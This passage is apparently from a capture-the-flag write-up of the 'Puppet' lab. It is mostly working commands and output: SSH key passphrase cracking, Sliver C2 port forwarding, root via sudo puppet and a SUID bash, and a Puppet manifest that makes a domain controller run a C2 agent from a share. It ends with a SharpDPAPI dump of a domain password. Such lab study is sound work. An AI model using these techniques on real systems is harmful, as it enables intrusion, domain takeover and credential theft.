+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIDS4W6uOArXO9Sk20zh7L7wAhVJXtBJlE81UZTrWNTv svc_puppet_lin_t1@puppet.vl
+The ed25519 private key was likely passphrase-protected. To crack the passphrase, ssh2john (part of the John the Ripper suite) was used to convert the private key into a hash format that John the Ripper could understand.
+
+┌──(toothless5143@kali)-[~]
+└─$ ssh2john ed25519 > hash
+John the Ripper was then used with the rockyou.txt wordlist to crack the passphrase from the generated hash file.
+
+┌──(toothless5143@kali)-[~]
+└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
+Cost 2 (iteration count) is 16 for all loaded hashes
+Will run 3 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+<REDACTED>           (ed25519)     
+1g 0:00:04:06 DONE (2025-05-21 12:54) 0.004061g/s 33.34p/s 33.34c/s 33.34C/s ANGEL1..oscar123
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+The cracked passphrase was redacted.
+
+Linux Host Puppet:
+
+To SSH into the Puppet Linux server (Which was also the Sliver C2 server), its SSH port (22) needed to be accessible. A port forward was set up using the active Sliver beacon on file01 (the one running as svc_puppet_win_t1). This forwarded connections from the attacker's localhost:2222 to 10.10.155.231:22.
+
+sliver (puppet-mtls) > portfwd add --bind 2222 -r 10.10.155.231:22
+
+[*] Port forwarding 127.0.0.1:2222 -> 10.10.155.231:22
+On the attacker’s machine, the downloaded ed25519 private key file likely had Windows-style line endings (CRLF). It was converted to Unix line endings (LF) using dos2unix. The content was then saved to a new file lin_key, and its permissions were set to 600 (read/write for owner only), which is required by most SSH clients for private keys.
+
+┌──(toothless5143@kali)-[~]
+└─$ dos2unix ed25519
+dos2unix: converting file ed25519 to Unix format...
+
+┌──(toothless5143@kali)-[~]
+└─$ cat ed25519 > lin_key                                  
+
+┌──(toothless5143@kali)-[~]
+└─$ chmod 600 lin_key    
+Finally, an SSH connection was established to the puppet server, using the lin_key private key, targeting svc_puppet_lin_t1@puppet.vl (which resolved to 127.0.0.1 due to the port forward), on port 2222. The -t flag forces pseudo-terminal allocation, which is often needed for interactive sessions.
+
+┌──(toothless5143@kali)-[~]
+└─$ ssh -i lin_key -t 'svc_puppet_lin_t1@puppet.vl'@127.0.0.1 -p 2222
+Enter passphrase for key 'lin_key': 
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-122-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Wed May 21 10:20:35 AM UTC 2025
+
+  System load:  0.22              Processes:             114
+  Usage of /:   64.3% of 9.75GB   Users logged in:       0
+  Memory usage: 14%               IPv4 address for eth0: 10.10.176.247
+  Swap usage:   0%
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Sat Oct 12 18:18:52 2024 from 10.8.0.101
+svc_puppet_lin_t1@puppet.vl@puppet:~$
+When prompted for the passphrase for lin_key, the cracked passphrase was entered, granting an interactive shell as svc_puppet_lin_t1 on the puppet Linux server.
+
+Privilege Escalation
+Upon logging in, the sudo -l command was executed. This command lists the commands that the current user is allowed to run as sudo (superuser or another user) according to the /etc/sudoers configuration.
+
+svc_puppet_lin_t1@puppet.vl@puppet:~$ sudo -l
+Matching Defaults entries for svc_puppet_lin_t1@puppet.vl on puppet:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User svc_puppet_lin_t1@puppet.vl may run the following commands on puppet:
+    (ALL) NOPASSWD: /usr/bin/puppet
+The output was highly significant: User svc_puppet_lin_t1@puppet.vl may run the following commands on puppet: (ALL) NOPASSWD: /usr/bin/puppet This meant that the svc_puppet_lin_t1 user could execute the /usr/bin/puppet command as any user (due to (ALL)) without needing to re-enter their password (due to NOPASSWD). This is a common privilege escalation vector.
+
+GTFOBins (https://gtfobins.github.io/) is a curated list of Unix binaries that can be abused to bypass local security restrictions. A search for puppet on GTFOBins revealed a method to escalate privileges using sudo puppet apply -e "exec { ... }". This allows arbitrary commands to be executed by Puppet as root.
+
+The chosen command aimed to set the SUID (Set User ID) bit on the /bin/bash executable. If the SUID bit is set on an executable owned by root, when any user runs that executable, it runs with the permissions of the owner (root in this case).
+
+svc_puppet_lin_t1@puppet.vl@puppet:~$ sudo puppet apply -e "exec { '/bin/sh -c \"chmod u+s /bin/bash\"': }"
+
+Notice: Compiled catalog for puppet.puppet.vl in environment production in 0.06 seconds
+Notice: /Stage[main]/Main/Exec[/bin/sh -c "chmod u+s /bin/bash"]/returns: executed successfully
+Notice: Applied catalog in 0.03 seconds
+This command instructed Puppet to apply a resource definition that executes /bin/sh -c "chmod u+s /bin/bash". The chmod u+s command sets the SUID bit.
+
+After the command executed successfully, /bin/bash had the SUID bit set and was still owned by root. Running bash with the -p flag tells it not to drop effective UID if it's different from the real UID (i.e., to honor the SUID bit).
+
+svc_puppet_lin_t1@puppet.vl@puppet:~$ bash -p
+
+bash-5.1# whoami
+root
+The whoami command now returned root, confirming successful privilege escalation to root on the puppet server. The flag for this stage was found in the root directory.
+
+As root, further enumeration of the Puppet master’s configuration was possible. The command sudo puppet cert list --all was run to list all Puppet client certificates known to this master. This output confirmed that both dc01.puppet.vl and file01.puppet.vl were indeed managed clients of this Puppet master instance (pm01 or puppet.puppet.vl). This was key for the next phase.
+
+bash-5.1# sudo puppet cert list --all
+Warning: `puppet cert` is deprecated and will be removed in a future release.
+   (location: /usr/lib/ruby/vendor_ruby/puppet/application.rb:370:in `run')
+
++ "dc01.puppet.vl"   (SHA256) E4:C3:42:71:83:88:08:07:6A:C5:A1:9D:FA:C2:7E:BB:D5:65:5F:71:9F:D3:BE:11:96:B7:26:CD:4F:5C:68:C6
++ "file01.puppet.vl" (SHA256) 61:ED:86:C3:55:35:36:89:D5:FC:3A:32:05:D1:23:EC:C3:F1:58:E4:D7:9A:6B:3E:65:F4:F2:F2:77:34:B0:CA
++ "pm01"             (SHA256) 94:8C:76:E9:D1:43:CA:FF:6C:06:34:80:23:02:8C:49:20:00:B2:43:62:42:16:7B:AF:4F:A6:68:F3:C2:D8:06 (alt names: "DNS:pm01", "DNS:puppet")
++ "pm01.localdomain" (SHA256) 2D:DC:44:F8:49:B6:41:B3:9A:2A:AE:B3:D2:9F:C7:6F:1F:0A:62:00:19:EB:B8:93:D6:C6:65:28:60:D9:F1:B8 (alt names: "DNS:pm01.localdomain", "DNS:puppet")
++ "puppet.puppet.vl" (SHA256) 11:65:85:DB:9F:E4:19:03:04:21:92:4B:19:03:17:6D:29:A9:E9:56:0F:04:A6:16:2B:44:46:A3:33:20:92:9C (alt names: "DNS:puppet", "DNS:puppet.puppet.vl")
+Lateral Movement
+Since dc01.puppet.vl was a managed Puppet client, its configuration could be controlled by creating or modifying Puppet manifests on the master. A manifest is a file written in Puppet's declarative language that describes the desired state of a system. The plan was to create a manifest that would instruct the Puppet agent on dc01 to download and execute the Sliver agent (puppet-update.exe).
+
+First, the directory structure for Puppet manifests in the production environment was created if it didn't exist.
+
+bash-5.1# mkdir -p /etc/puppet/code/environments/production/manifests
+Then, a site.pp file (a common entry point for Puppet configurations) was created in this directory. This file defined a specific configuration for the node dc01.puppet.vl.
+
+bash-5.1# vim /etc/puppet/code/environments/production/manifests/site.pp
+
+bash-5.1# cat /etc/puppet/code/environments/production/manifests/site.pp
+
+node 'dc01.puppet.vl' {
+  exec { 'pwned':
+    command   => 'C:\\Windows\\System32\\cmd.exe /c \\\\file01.puppet.vl\\files\\puppet-update.exe',
+    logoutput => true,
+  }
+}
+node default {
+  notify { 'This is the default node': }
+}
+This manifest defines an exec resource named pwned. When applied to dc01.puppet.vl, it would execute the command C:\Windows\System32\cmd.exe /c \\file01.puppet.vl\files\puppet-update.exe. This command tells dc01 to connect to an SMB share named files on file01.puppet.vl and run puppet-update.exe from there. The logoutput => true ensures output is logged.
+
+Before this manifest could be effective, the puppet-update.exe (Sliver agent binary) needed to be present on the \\file01.puppet.vl\files\ SMB share. This was accomplished by leveraging one of the existing Sliver beacons on file01 (e.g., the SYSTEM beacon 18bdeee4 or the PUPPET\Bruce.Smith beacon). A shell was obtained through Sliver on file01, and PowerShell was used to copy the agent from its typical location (C:\ProgramData\puppet\puppet-update.exe) to the files share. (This step assumes the files share on file01 exists and is writable by the context of the beacon used).
+
+Using a shell on a file01 beacon:
+
+sliver (puppet-mtls) > shell
+
+? This action is bad OPSEC, are you an adult? Yes
+
+[*] Wait approximately 10 seconds after exit, and press <enter> to continue
+[*] Opening shell tunnel (EOF to exit) ...
+
+[*] Started remote shell with pid 3108
+
+PS C:\programdata\puppet> powershell -Command "Copy-Item -Path 'C:\ProgramData\puppet\puppet-update.exe' -Destination '\\file01.puppet.vl\files\puppet-update.exe'"
+With the Sliver agent staged on the file01 share, the Puppet configuration was applied on the Puppet master (puppet Linux server). The puppet apply command compiles and applies the manifest.
+
+bash-5.1# puppet apply /etc/puppet/code/environments/production/manifests/site.pp 
+
+Notice: Compiled catalog for puppet.puppet.vl in environment production in 0.02 seconds
+Notice: This is the default node
+Notice: /Stage[main]/Main/Node[default]/Notify[This is the default node]/message: defined 'message' as 'This is the default node'
+Notice: Applied catalog in 0.01 seconds
+When the Puppet agent on dc01 next checked in with the master (typically every 30 minutes, or sooner if triggered), it would retrieve and apply this new configuration. This caused dc01 to execute puppet-update.exe from the share.
+
+Windows Host DC01:
+
+Shortly after, a new beacon, ID 9cba2718, appeared in the Sliver C2 console. The hostname associated with this beacon was DC01. An sa-whoami command executed within this new beacon's session confirmed the user context as PUPPET\svc_puppet_win_t0. This indicated that the Puppet agent on DC01 was running as this service account.
+
+[*] Beacon 9cba2718 puppet-mtls - 10.10.135.21:58599 (DC01) - windows/amd64 - Wed, 21 May 2025 17:43:26 +06
+
+sliver (puppet-mtls) > use 9cba2718
+
+[*] Active beacon puppet-mtls (9cba2718-d93d-4f08-b7f4-ffbe5bc82a7b)
+
+sliver (puppet-mtls) > sa-whoami
+
+[*] Tasked beacon puppet-mtls (e8b0a5dd)
+
+[+] puppet-mtls completed task e8b0a5dd
+
+[*] Successfully executed sa-whoami (coff-loader)
+[*] Got output:
+
+UserName                SID
+====================== ====================================
+PUPPET\svc_puppet_win_t0        S-1-5-21-3066630505-2324057459-3046381011-1602
+Post Exploitation
+The newly acquired beacon on DC01 (session 9cba2718) was used to explore the system. A common place to find flags or sensitive information is the Administrator's Desktop.
+
+sliver (puppet-mtls) > ls
+
+C:\Users\Administrator\Desktop (3 items, 7.7 KiB)
+=================================================
+-rw-rw-rw-  desktop.ini         282 B    Wed Sep 25 22:24:15 -0700 2024
+-rw-rw-rw-  Microsoft Edge.lnk  2.3 KiB  Fri Oct 11 05:51:57 -0700 2024
+-rw-rw-rw-  root.txt            5.2 KiB  Sat Oct 12 01:46:14 -0700 2024
+
+
+sliver (puppet-mtls) > cat root.txt
+
+The final flag is the password of the user "root@puppet.vl".
+This command listed the files on the Administrator’s desktop on DC01. Among the files was root.txt. The content of this file was read using cat root.txt: The final flag is the password of the user "root@puppet.vl". This was a clue, not the flag itself. The actual password for the PUPPET\root account (presumably a domain account, given the PUPPET\ prefix) needed to be found.
+
+Since the beacon on DC01 was running as PUPPET\svc_puppet_win_t0, which might not have SYSTEM privileges, and Mimikatz might not directly reveal the PUPPET\root password if it wasn't recently used or cached in LSASS under that context, SharpDPAPI was chosen. SharpDPAPI is a C# tool for interacting with Windows Data Protection API (DPAPI). DPAPI is used by Windows to protect sensitive user data, such as stored passwords for scheduled tasks, network credentials, and some application secrets. SharpDPAPI can, under certain conditions (often requiring SYSTEM privileges on the machine or the user's own credentials), decrypt these DPAPI-protected "blobs." The machinetriage command in SharpDPAPI attempts to find and decrypt various DPAPI secrets stored on the system, particularly those protected with the machine's DPAPI master key (accessible by SYSTEM).
+
+sliver (puppet-mtls) > sharpdpapi machinetriage
+
+[*] sharpdpapi output:
+
+  __                 _   _       _ ___ 
+ (_  |_   _. ._ ._  | \ |_) /\  |_) |  
+ __) | | (_| |  |_) |_/ |  /--\ |  _|_ 
+                |                      
+  v1.12.0                               
+
+<SNIP>
+Folder       : C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials
+
+  CredFile           : 39FAB9BA3A19E88594B1D50B5E44AAA4
+
+    guidMasterKey    : {e2de4c34-3c46-411f-91cb-ab2c9cd2f205}
+    size             : 592
+    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
+    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
+    description      : Local Credential Data
+
+    LastWritten      : 10/12/2024 1:44:00 AM
+    TargetName       : Domain:batch=TaskScheduler:Task:{ACFD7F3B-51A4-4B11-8428-F287E956EC4C}
+    TargetAlias      : 
+    Comment          : 
+    UserName         : PUPPET\root
+    Credential       : <REDACTED FLAG>
+</SNIP>
+The output of sharpdpapi machinetriage was extensive, but among the decrypted items was a credential blob for UserName: PUPPET\root. The Credential field associated with this entry contained the actual plaintext password: <REDACTED FLAG>. This password was the final flag for the Puppet VulnLab challenge.
+
+This comprehensive attack chain demonstrated a sequence of vulnerabilities and misconfigurations, from anonymous FTP access and PrintNightmare to insecure Puppet configurations and weak SSH key management, ultimately leading to full domain compromise.
